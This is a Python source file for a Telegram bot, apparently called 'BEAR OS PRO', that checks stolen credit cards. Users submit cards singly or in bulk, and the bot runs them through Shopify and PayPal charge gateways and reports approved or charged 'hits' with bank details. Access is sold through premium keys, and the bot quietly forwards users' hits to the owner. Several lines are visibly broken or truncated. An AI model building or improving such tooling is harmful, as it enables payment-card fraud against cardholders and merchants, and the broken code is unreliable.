import asyncio
import os
import secrets
import string
import json
import time
import re
import aiohttp
import html
from datetime import datetime, timedelta
import traceback

from aiogram import Bot, Dispatcher, Router, F
from aiogram.types import (
    Message, CallbackQuery, BotCommand, 
    BotCommandScopeDefault, BotCommandScopeChat, 
    BotCommandScopeAllPrivateChats, 
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# --- BACKEND IMPORTS ---
from api import process_card_async, parse_cc_string, extract_clean_response
from paypal import check_paypal_cc 

# --- SAFE CONFIGURATION ---
BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
RAW_ADMINS = str(os.getenv("ADMIN_ID", "7688706582"))

# Aggressively clean the Railway variable
ADMIN_IDS = [
    re.sub(r'[^0-9]', '', x) 
    for x in RAW_ADMINS.split(",") if x.strip()
]
if "7688706582" not in ADMIN_IDS:
    ADMIN_IDS.append("7688706582")
ADMIN_IDS =

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"

# --- CORE UTILITIES & VALIDATION ---
def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

def load_db(filename):
    if os.path.exists(filename):
        try:
            with open(filename, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(filename, data):
    with open(filename, "w") as f: json.dump(data, f, indent=4)

def check_tier(user_id):
    if is_admin(user_id): 
        return "👑 Admin"
        
    db = load_db(PREMIUM_FILE)
    uid_str = str(user_id)
    
    if uid_str in db:
        try:
            expiry = datetime.fromisoformat(str(db[uid_str]))
            if datetime.now() < expiry: 
                return "💎 Premium"
            else:
                del db[uid_str]
                save_db(PREMIUM_FILE, db)
        except:
            return "💎 Premium (Legacy)"
            
    return "🔑 Key User"

def add_user(user_id):
    try:
        users = load_db(USERS_FILE)
        if str(user_id) not in users:
            users[str(user_id)] = datetime.now().isoformat()
            save_db(USERS_FILE, users)
    except: pass

async def get_bin_info(session, cc):
    try:
        bin6 = cc[:6]
        async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=5) as res:
            if res.status == 200:
                data = await res.json()
                return (
                    data.get('brand', 'Unknown'),
                    data.get('bank', 'Unknown'),
                    data.get('country_name', 'Unknown'),
                    data.get('country_flag', ''),
                    data.get('type', 'Unknown')
                )
    except: pass
    return "Unknown", "Unknown", "Unknown", "", "Unknown"

# --- FSM STATES ---
class AppStates(StatesGroup):
    waiting_shopify_single = State()
    waiting_shopify_mass = State()
    waiting_paypal_single = State()
    waiting_paypal_mass = State()

# --- PREMIUM UI FORMATTERS ---
def format_summary(status_header, checker, total, app, dec, err, start_time, tier, username):
    elapsed = time.time() - start_time
    processed = app + dec + err
    speed = processed / elapsed if elapsed > 0 else 0
    hit_rate = round((app / processed * 100), 2) if processed > 0 else 0
    
    return f"""<code>╭━━━━━━━━━━━━━━━━━━━━━╮ &lt;/&gt;
🏁 {checker.upper()} — {status_header}
╰━━━━━━━━━━━━━━━━━━━━━╯
📦 Total      : {total} cards
✅ Approved   : {app}
❌ Declined   : {dec}
⚠️ Errors     : {err}
📈 Hit Rate   : {hit_rate}%
⚡ Avg Speed  : {speed:.1f} cards/s
⏱ Time       : {elapsed:.1f}s
━━━━━━━━━━━━━━━━━━━━━━━
🎫 Tier       : {tier}
-----------------------
   BY @{username}
━━━━━━━━━━━━━━━━━━━━━━━</code>"""

def generate_stats_keyboard(app, dec, err, start_time):
    elapsed = time.time() - start_time
    processed = app + dec + err
    speed = processed / elapsed if elapsed > 0 else 0
    hit_rate = round((app / processed * 100), 2) if processed > 0 else 0

    return InlineKeyboardMarkup(inline_keyboard=,
       )

def format_single_hit(status, checker, result, cc, country, flag, bank, brand, c_type, elapsed, tier, username):
    if status in: 
        header = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅" if status!= "CHARGED" else "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥"
    elif status == "DECLINED": 
        header = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"
    else: 
        header = "𝗘𝗥𝗥𝗢𝗥 ⚠️"
    
    safe_result = html.escape(str(result))
    
    return f"""<b>{header}</b>

<b>𝗖𝗖 ⇾</b> <code>{cc}</code>
<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾</b> {checker}
<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾</b> <code>{safe_result}</code>
<b>𝗕𝗜𝗡 ⇾</b> {brand} — {c_type.upper()}
<b>𝗕𝗮𝗻𝗸 ⇾</b> {bank} | {country} {flag}

<b>𝗧𝗶𝗺𝗲 ⇾</b> {elapsed:.2f}s
<b>𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾</b> @{username}
🎫 <b>𝗧𝗶𝗲𝗿 ⇾</b> {tier}"""

@router.callback_query(F.data == "noop")
async def noop_callback(callback: CallbackQuery):
    await callback.answer()

# --- DEBUG COMMAND ---
@router.message(Command("myid"))
async def cmd_myid(message: Message):
    uid = str(message.from_user.id)
    admin_status = "✅ YES" if is_admin(uid) else "❌ NO"
    
    res = (
        f"🔍 <b>System Diagnostic</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Your Account ID:</b> <code>{uid}</code>\n"
        f"👑 <b>Admin Privileges:</b> {admin_status}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )
    await message.answer(res)

# --- CORE MENU & INFO ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    try:
        await state.clear() 
        add_user(message.from_user.id)
        
        menu_text = (
            "👋 <b>Welcome to the Checker Bot</b>\n\n"
            "📌 <b>Available Commands:</b>\n\n"
            "💳 <b>Checkers:</b>\n"
            "• /mpp → Mass PayPal check\n"
            "• /pp → Single PayPal check\n"
            "• /msh → Mass Shopify check\n"
            "• /sh → Single Shopify check\n\n"
            "🔑 <b>Keys:</b>\n"
            "• /redeem → Redeem a key\n\n"
            "⚙️ <b>Other:</b>\n"
            "• /status → View your plan/status\n"
            "• /myid → Check your account ID\n"
        )
        
        if is_admin(message.from_user.id):
            menu_text += (
                "\n👑 <b>Admin Commands:</b>\n"
                "• /genkey [qty][days] → Generate keys\n"
                "• /broadcast [msg] → Message all users\n"
                "• /users → Show bot statistics\n"
            )
            
        menu_text += "\n━━━━━━━━━━━━━━━━━━━━"
        await message.answer(menu_text)
    except Exception as e:
        safe_error = html.escape(str(e))
        await message.answer(f"⚠️ <b>BOT ERROR:</b>\n<code>{safe_error}</code>")

@router.message(Command("status"))
async def cmd_status(message: Message, state: FSMContext):
    try:
        await state.clear()
        tier = check_tier(message.from_user.id)
        db = load_db(PREMIUM_FILE)
        uid = str(message.from_user.id)
        
        if is_admin(uid):
            expiry_text = "Lifetime"
        elif "Premium" in tier:
            try:
                exp = datetime.fromisoformat(db[uid])
                expiry_text = exp.strftime('%Y-%m-%d %H:%M:%S')
            except:
                expiry_text = "Lifetime (Legacy Format)"
        else:
            expiry_text = "N/A"
            
        await message.answer(f"👤 <b>Your Status</b>\n━━━━━━━━━━\n🔑 <b>Tier:</b> {tier}\n⏳ <b>Expires:</b> {expiry_text}")
    except Exception as e:
        safe_error = html.escape(str(e))
        await message.answer(f"⚠️ <b>BOT ERROR:</b>\n<code>{safe_error}</code>")

# --- KEY & ADMIN SYSTEM ---
@router.message(Command("genkey"))
async def cmd_genkey(message: Message, command: CommandObject, state: FSMContext):
    try:
        await state.clear()
        if not is_admin(message.from_user.id): 
            return await message.answer("❌ Admin only command.")
        
        args = command.args
        if not args:
            return await message.answer("⚠️ Usage: <code>/genkey 10 7d</code>")
        
        parts = args.split()
        count = int(parts)
        duration_str = parts.[1]lower()
        days = int(duration_str.replace('d', '')) if 'd' in duration_str else int(duration_str)
            
        keys_db = load_db(KEYS_FILE)
        generated =
        for _ in range(count):
            k = "BEAR-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(12))
            keys_db[k] = days
            generated.append(f"<code>{k}</code>")
            
        save_db(KEYS_FILE, keys_db)
        await message.answer(f"✅ <b>Generated {count} Keys ({days} Days)</b>\n\n" + "\n".join(generated))
    except Exception as e:
        await message.answer("⚠️ <b>ERROR:</b> Invalid format. Use: <code>/genkey 10 7d</code>")

@router.message(Command("redeem"))
async def cmd_redeem(message: Message, command: CommandObject, state: FSMContext):
    try:
        await state.clear()
        key = command.args
        if not key: return await message.answer("⚠️ Usage: <code>/redeem BEAR-XXXX</code>")
            
        keys_db = load_db(KEYS_FILE)
        if key not in keys_db: return await message.answer("❌ Invalid or expired key.")
            
        days = keys_db[key]
        prem_db = load_db(PREMIUM_FILE)
        uid = str(message.from_user.id)
        current_expiry = datetime.now()
        
        if uid in prem_db:
            try:
                saved_exp = datetime.fromisoformat(prem_db[uid])
                if saved_exp > current_expiry: current_expiry = saved_exp
            except: pass
                
        prem_db[uid] = (current_expiry + timedelta(days=days)).isoformat()
        del keys_db[key]
        save_db(PREMIUM_FILE, prem_db)
        save_db(KEYS_FILE, keys_db)
        
        await message.answer(f"✅ <b>Successfully Redeemed!</b>\nAdded {days} days to your subscription.")
    except Exception as e:
        safe_error = html.escape(str(e))
        await message.answer(f"⚠️ <b>BOT ERROR:</b>\n<code>{safe_error}</code>")

@router.message(Command("broadcast"))
async def cmd_broadcast(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id): return
    if not command.args: return await message.answer("⚠️ Include a message to broadcast.")
    
    users = load_db(USERS_FILE)
    sent = 0
    msg = await message.answer(f"⏳ Broadcasting to {len(users)} users...")
    for uid in users:
        try:
            await bot.send_message(uid, f"📢 <b>Announcement</b>\n━━━━━━━━━━\n{command.args}")
            sent += 1
            await asyncio.sleep(0.05)
        except: pass
    await msg.edit_text(f"✅ Broadcast complete. Sent to {sent}/{len(users)} users.")

@router.message(Command("users"))
async def cmd_users(message: Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id): return
    users = load_db(USERS_FILE)
    prem = load_db(PREMIUM_FILE)
    await message.answer(f"📊 <b>Bot Statistics</b>\n━━━━━━━━━━\n👥 Total Users: {len(users)}\n💎 Premium Users: {len(prem)}")

# --- CHECKER PROCESSOR (SINGLE & MASS) ---
async def process_checker(message: Message, text: str, checker: str):
    user_id = message.from_user.id
    tier = check_tier(user_id)
    
    is_mass = "mass" in checker.lower()
    
    if "Free" in tier and is_mass and not is_admin(user_id):
        return await message.answer("❌ Upgrade to Premium to use Mass Checkers.")
        
    ccs = re.findall(r"\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}", text)
    if not ccs:
        return await message.answer("❌ No valid cards found. Ensure format is CC|MM|YYYY|CVV")
        
    total_cards = len(ccs)
    if total_cards > 1 and not is_mass and not is_admin(user_id):
        return await message.answer("⚠️ You provided multiple cards for a Single Check. Use Mass Check instead.")
        
    app, dec, err = 0, 0, 0
    start_time = time.time()
    username = message.from_user.username or message.from_user.first_name
    
    # 1. SETUP INITIAL MESSAGE
    if is_mass:
        init_text = format_summary("STARTING...", checker, total_cards, app, dec, err, start_time, tier, username)
        kb = generate_stats_keyboard(app, dec, err, start_time)
        msg = await message.answer(init_text, reply_markup=kb)
    else:
        msg = await message.answer(f"⏳ <b>Initializing {checker}...</b>")

    # 2. RUN THE CHECKER LOOP
    async with aiohttp.ClientSession() as session:
        for idx, cc in enumerate(ccs, 1):
            parts = parse_cc_string(cc)
            cc_clean, mes, ano, cvv = parts['cc'], parts['mes'], parts['ano'], parts['cvv']
            brand, bank, country, flag, c_type = await get_bin_info(session, cc_clean)
            
            try:
                if "Shopify" in checker:
                    success, raw, g_name, p, c = await process_card_async(cc_clean, mes, ano, cvv, "https://shop.spam.com")
                    resp = extract_clean_response(raw)
                    
                    resp_upper = resp.upper()
                    if any(x in resp_upper for x in):
                        status = "CHARGED"
                    elif any(x in resp_upper for x in):
                        status = "APPROVED"
                    elif any(x in resp_upper for x in):
                        status = "DECLINED"
                    else:
                        status = "CHARGED" if success else "DECLINED"
                        
                else: 
                    status, raw = await asyncio.to_thread(check_paypal_cc, cc)
                    resp = extract_clean_response(raw)
                    
            except Exception as e:
                status, resp = "ERROR", str(e)[:30]
                
            if status in: 
                app += 1
            elif status == "DECLINED": 
                dec += 1
            else: 
                err += 1
            
            elapsed = time.time() - start_time
            
            # --- 3. HANDLE SINGLE HIT OUTPUT ---
            if status in or not is_mass:
                hit_text = format_single_hit(status, checker, resp, cc, country, flag, bank, brand, c_type, elapsed, tier, username)
                
                if not is_mass:
                    try: await msg.edit_text(hit_text)
                    except: pass
                else:
                    if status in:
                        await message.answer(hit_text)
                        
                # Silent Admin Ping
                if status in:
                    owner = ADMIN_IDS if ADMIN_IDS else None
                    if owner and str(user_id)!= owner:
                        try: await bot.send_message(owner, f"🔥 <b>NEW HIT</b>\n{hit_text}")
                        except: pass
            
            # --- 4. HANDLE MASS CHECK UI UPDATES ---
            if is_mass:
                if (idx % 3 == 0) or idx == total_cards:
                    header = "CHECKING" if idx < total_cards else "COMPLETE"
                    summary_text = format_summary(header, checker, total_cards, app, dec, err, start_time, tier, username)
                    kb = generate_stats_keyboard(app, dec, err, start_time)
                    try: await msg.edit_text(summary_text, reply_markup=kb)
                    except: pass
                    
            await asyncio.sleep(0.5)

# --- ONE-LINE COMMAND ROUTERS ---
@router.message(Command("sh"))
async def cmd_sh(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    if not command.args:
        return await message.answer("⚠️ <b>Usage:</b> <code>/sh CC|MM|YYYY|CVV</code>")
    await process_checker(message, command.args, "Shopify Single")

@router.message(Command("pp"))
async def cmd_pp(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    if not command.args:
        return await message.answer("⚠️ <b>Usage:</b> <code>/pp CC|MM|YYYY|CVV</code>")
    await process_checker(message, command.args, "PayPal Single ($1)")

@router.message(Command("msh"))
async def cmd_msh(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    text = command.args or ""
    
    if message.reply_to_message and message.reply_to_message.document:
        file = await bot.get_file(message.reply_to_message.document.file_id)
        result = await bot.download_file(file.file_path)
        text += "\n" + result.read().decode('utf-8')
    elif message.document:
        file = await bot.get_file(message.document.file_id)
        result = await bot.download_file(file.file_path)
        text += "\n" + result.read().decode('utf-8')
        
    if not text.strip():
        return await message.answer("⚠️ <b>Usage:</b> <code>/msh CC|MM...</code> or reply to a.txt file.")
        
    await process_checker(message, text, "Shopify Mass")

@router.message(Command("mpp"))
async def cmd_mpp(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    text = command.args or ""
    
    if message.reply_to_message and message.reply_to_message.document:
        file = await bot.get_file(message.reply_to_message.document.file_id)
        result = await bot.download_file(file.file_path)
        text += "\n" + result.read().decode('utf-8')
    elif message.document:
        file = await bot.get_file(message.document.file_id)
        result = await bot.download_file(file.file_path)
        text += "\n" + result.read().decode('utf-8')
        
    if not text.strip():
        return await message.answer("⚠️ <b>Usage:</b> <code>/mpp CC|MM...</code> or reply to a.txt file.")
        
    await process_checker(message, text, "PayPal Mass ($1)")

# --- COMMAND MENU SETUP ---
async def setup_bot_commands(bot: Bot):
    user_commands =
    
    admin_commands = user_commands + Generate keys"),
        BotCommand(command="broadcast", description=" Message all users"),
        BotCommand(command="users", description=" View bot stats"),
    ]
    
    await bot.set_my_commands(user_commands, scope=BotCommandScopeAllPrivateChats())
    
    for admin_id in ADMIN_IDS:
        try:
            await bot.set_my_commands(admin_commands, scope=BotCommandScopeChat(chat_id=int(admin_id)))
        except Exception as e:
            print(f"Could not push admin commands to {admin_id}: {e}")

# --- MAIN DEPLOYMENT ---
async def main():
    print("BEAR OS PRO DEPLOYED - FULLY REPAIRED")
    await setup_bot_commands(bot)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
